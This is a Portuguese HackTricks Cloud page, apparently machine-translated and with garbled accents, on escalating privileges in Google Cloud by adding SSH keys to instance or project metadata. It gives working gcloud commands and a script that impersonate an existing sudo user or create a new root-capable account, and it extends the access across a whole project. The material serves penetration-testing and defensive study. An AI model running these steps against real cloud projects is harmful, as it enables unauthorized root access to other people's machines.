# GCP - Adicionar Metadados SSH Personalizados

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Modificando os metadados <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Um atacante com permiss√µes para **modificar os metadados da inst√¢ncia** poderia comprometer/escalar para uma conta de servi√ßo com essa permiss√£o (que pode ser restrita por um escopo):

### **Adicionar chaves SSH aos metadados personalizados**

**Sistemas Linux** no GCP geralmente executam scripts do [Ambiente de Convidado Linux Python para Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Um desses √© o [daemon de contas](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), que **periodicamente** **consulta** o ponto de extremidade de metadados da inst√¢ncia para **altera√ß√µes nas chaves p√∫blicas SSH autorizadas**.

**Se uma nova chave p√∫blica** for encontrada, ela ser√° processada e **adicionada √† m√°quina local**. Dependendo do formato da chave, ela ser√° adicionada ao arquivo `~/.ssh/authorized_keys` de um **usu√°rio existente ou criar√° um novo usu√°rio com direitos de `sudo`**.

Portanto, se voc√™ pode **modificar os metadados personalizados da inst√¢ncia** com sua conta de servi√ßo, voc√™ pode **escalar** para root no sistema local **obtendo direitos SSH** para uma conta privilegiada. Se voc√™ pode modificar **metadados personalizados do projeto**, voc√™ pode **escalar** para root em **qualquer sistema no projeto GCP atual** que esteja executando o daemon de contas.

### **Adicionar chave SSH a usu√°rio privilegiado existente**

Vamos come√ßar adicionando nossa pr√≥pria chave a uma conta existente, pois isso provavelmente far√° menos barulho.

**Verifique a inst√¢ncia para chaves SSH existentes**. Escolha um desses usu√°rios, pois √© prov√°vel que eles tenham direitos de sudo.
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
Procure por uma se√ß√£o como a seguinte:
```
...
metadata:
fingerprint: QCZfVTIlKgs=
items:
...
- key: ssh-keys
value: |-
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
...
```
Observe o **formato um pouco estranho** das chaves p√∫blicas - o **nome de usu√°rio** √© listado no **in√≠cio** (seguido por dois pontos) e depois novamente no **final**. Precisaremos corresponder a este formato. Diferente da opera√ß√£o normal de chave SSH, o nome de usu√°rio √© absolutamente importante!

**Salve as linhas com nomes de usu√°rio e chaves em um novo arquivo de texto** chamado `meta.txt`.

Vamos supor que estamos mirando no usu√°rio `alice` mencionado acima. Vamos **gerar uma nova chave** para n√≥s mesmos assim:
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
Adicione sua nova chave p√∫blica ao arquivo `meta.txt` imitando o formato:
```
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnthNXHxi31LX8PlsGdIF/wlWmI0fPzuMrv7Z6rqNNgDYOuOFTpM1Sx/vfvezJNY+bonAPhJGTRCwAwytXIcW6JoeX5NEJsvEVSAwB1scOSCEAMefl0FyIZ3ZtlcsQ++LpNszzErreckik3aR+7LsA2TCVBjdlPuxh4mvWBhsJAjYS7ojrEAtQsJ0mBSd20yHxZNuh7qqG0JTzJac7n8S5eDacFGWCxQwPnuINeGoacTQ+MWHlbsYbhxnumWRvRiEm7+WOg2vPgwVpMp4sgz0q5r7n/l7YClvh/qfVquQ6bFdpkVaZmkXoaO74Op2Sd7C+MBDITDNZPpXIlZOf4OLb alice
```
Agora, voc√™ pode **reescrever os metadados da chave SSH** para a sua inst√¢ncia com o seguinte comando:
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
Voc√™ agora pode **acessar um shell no contexto de `alice`** da seguinte forma:
```
lowpriv@instance:~$ ssh -i ./key alice@localhost
alice@instance:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```
### **Criar um novo usu√°rio privilegiado e adicionar uma chave SSH**

Nenhuma chave existente encontrada ao seguir os passos acima? Ningu√©m mais interessante em `/etc/passwd` para alvo?

Voc√™ pode **seguir o mesmo processo** que o acima, mas apenas **crie um novo nome de usu√°rio**. Esse usu√°rio ser√° criado automaticamente e receber√° direitos para `sudo`. De forma scriptada, o processo seria assim:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### Chaves SSH no n√≠vel do projeto <a href="#sshing-around" id="sshing-around"></a>

Seguindo os detalhes mencionados na se√ß√£o anterior, voc√™ pode tentar comprometer mais VMs.

Podemos expandir um pouco essas informa√ß√µes [**aplicando chaves SSH no n√≠vel do projeto**](https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#project-wide), concedendo permiss√£o para **acessar via SSH uma conta privilegiada** em qualquer inst√¢ncia que n√£o tenha escolhido explicitamente a op√ß√£o "Bloquear chaves SSH de √¢mbito do projeto".
```
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
Se voc√™ for realmente ousado, tamb√©m pode digitar `gcloud compute ssh [INSTANCE]` para usar seu nome de usu√°rio atual em outras m√°quinas.

# Refer√™ncias
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

<details>

<summary><strong>Aprenda hacking em AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
